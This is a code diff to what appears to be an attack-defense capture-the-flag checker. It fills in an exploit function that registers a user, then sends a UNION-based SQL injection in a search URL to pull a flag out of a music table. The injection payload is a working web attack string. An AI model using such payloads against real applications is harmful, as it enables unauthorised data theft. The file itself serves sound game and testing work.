@@ -40,7 +40,14 @@ async def getflag_test(
 
 @checker.exploit(0)
 async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
-    pass
+    # TODO for now
+    logger = None
+    url = utils.register_user_and_open_main_page(client, logger)
+
+    response = client.get(url + "/search=FindMe'' UNION SELECT binary FROM music ---")
+    # Find flag in response text
+    if flag := searcher.search_flag(response.text):
+        return flag
 
 
 @checker.putflag(1)
